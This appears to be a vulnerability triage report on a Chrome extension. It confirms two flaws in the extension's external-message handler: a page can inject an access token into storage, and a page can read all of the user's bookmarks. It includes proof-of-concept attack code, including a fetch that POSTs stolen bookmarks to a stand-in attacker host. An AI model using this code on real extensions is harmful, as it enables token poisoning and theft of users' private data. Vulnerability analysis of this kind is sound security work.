# CoCo Analysis: kdnfbangdkkddhgamelpdcgfmaecicel

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 23 (1 storage sink + 22 bookmark leaks via sendResponseExternal)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kdnfbangdkkddhgamelpdcgfmaecicel/opgen_generated_files/bg.js
Line 1032: const token = request.access_token;

**Code:**

```javascript
// Background script - External message handler
chrome.runtime.onMessageExternal.addListener(function (
  request,
  sender,
  sendResponse
) {
  if (request && request.action === "getJWT") {
    const token = request.access_token; // ← attacker-controlled
    chrome.storage.local.set({ access_token: token }).then(() => { // Storage write sink
      console.log("set access_token", token);
    });
    sendResponse({ status: "recieved" });
  } else if (request && request.action === "getBookmarks") {
    chrome.bookmarks.getTree((bookmarks) => { // ← sensitive data
      sendResponse({ bookmarks: bookmarks }); // Information disclosure sink
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a webpage on https://malicious.nous.fyi/ or https://nous-revamp.vercel.app/
chrome.runtime.sendMessage(
  'kdnfbangdkkddhgamelpdcgfmaecicel',
  { action: 'getJWT', access_token: 'attacker_controlled_token' },
  function(response) {
    console.log('Injected malicious token into storage');
  }
);
```

**Impact:** Attacker can write arbitrary data to chrome.storage.local, potentially poisoning the access token used by the extension for authentication.

---

## Sink 2: BookmarkTreeNode_source → sendResponseExternal_sink (22 variations)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kdnfbangdkkddhgamelpdcgfmaecicel/opgen_generated_files/bg.js
Lines 846-862: BookmarkTreeNode mock source objects
Line 1038-1040: chrome.bookmarks.getTree() → sendResponse()

**Code:**

```javascript
// Background script - External message handler
chrome.runtime.onMessageExternal.addListener(function (
  request,
  sender,
  sendResponse
) {
  if (request && request.action === "getBookmarks") {
    chrome.bookmarks.getTree((bookmarks) => { // ← sensitive data (all bookmarks)
      sendResponse({ bookmarks: bookmarks }); // Sends to external caller
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a webpage on https://malicious.nous.fyi/ or https://nous-revamp.vercel.app/
chrome.runtime.sendMessage(
  'kdnfbangdkkddhgamelpdcgfmaecicel',
  { action: 'getBookmarks' },
  function(response) {
    console.log('Stolen all bookmarks:', response.bookmarks);
    // Exfiltrate to attacker server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(response.bookmarks)
    });
  }
);
```

**Impact:** Attacker can exfiltrate all user bookmarks, including sensitive URLs, bookmark structure, and titles. This is a privacy violation exposing the user's browsing history and interests.
